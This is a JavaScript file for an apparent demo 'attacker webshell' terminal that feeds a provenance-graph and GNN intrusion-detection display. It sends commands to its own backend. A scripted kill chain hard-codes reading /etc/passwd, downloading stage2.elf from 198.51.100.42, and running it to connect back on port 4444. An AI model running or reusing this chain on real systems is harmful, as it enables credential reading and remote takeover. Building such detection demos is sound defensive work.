// Window 2 (Attacker WebShell) Interactive Logic
document.addEventListener("DOMContentLoaded", () => {
  const terminalBody = document.getElementById("terminalBody");
  const cmdInput = document.getElementById("cmdInput");
  const quickButtons = document.querySelectorAll(".quick-btn");

  const appendOutput = (cmd, text, stage) => {
    // Append executed command
    const cmdDiv = document.createElement("div");
    cmdDiv.className = "prompt-line";
    cmdDiv.innerHTML = `<span class="prompt-prefix">attacker@victim-wsl2:~$</span> <span style="color:#fff;">${escapeHtml(cmd)}</span>`;
    terminalBody.appendChild(cmdDiv);

    // Append stage badge if applicable
    if (stage && stage !== "none") {
      const stageDiv = document.createElement("div");
      stageDiv.style.cssText = "color: #fbbf24; font-size: 0.8rem; margin: 2px 0; font-weight: bold;";
      stageDiv.innerText = `[STAGE: ${stage}] -> Triggered Provenance Ingestion & GNN Alert`;
      terminalBody.appendChild(stageDiv);
    }

    // Append stdout
    if (text) {
      const outDiv = document.createElement("div");
      outDiv.className = "term-out";
      if (text.includes("ROOT") || text.includes("Reverse Shell") || text.includes("passwd")) {
        outDiv.className += " danger";
      }
      outDiv.innerText = text;
      terminalBody.appendChild(outDiv);
    }

    terminalBody.scrollTop = terminalBody.scrollHeight;
  };

  const escapeHtml = (str) => {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  };

  const executeCommand = async (cmd) => {
    if (!cmd.trim()) return;
    try {
      const res = await fetch("/api/terminal/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd })
      });
      const data = await res.json();
      appendOutput(data.command, data.output, data.stage);
    } catch (err) {
      appendOutput(cmd, `[!] Network/Execution Error: ${err.message}`, "Error");
    }
  };

  cmdInput.addEventListener("keydown", async (e) => {
    if (e.key === "Enter") {
      const cmd = cmdInput.value;
      cmdInput.value = "";
      await executeCommand(cmd);
    }
  });

  quickButtons.forEach((btn) => {
    btn.addEventListener("click", async () => {
      const cmd = btn.getAttribute("data-cmd");
      if (cmd === "RUN_FULL_CHAIN") {
        // Execute Kill Chain step-by-step with dramatic delays
        const chain = [
          "whoami && id",
          "cat /etc/passwd",
          "curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf",
          "chmod +x /tmp/stage2.elf && /tmp/stage2.elf --connect 198.51.100.42:4444"
        ];
        for (const c of chain) {
          await executeCommand(c);
          await new Promise((r) => setTimeout(r, 900));
        }
      } else {
        await executeCommand(cmd);
      }
    });
  });

  // Focus input on terminal click
  document.querySelector(".term-window").addEventListener("click", () => {
    cmdInput.focus();
  });
});
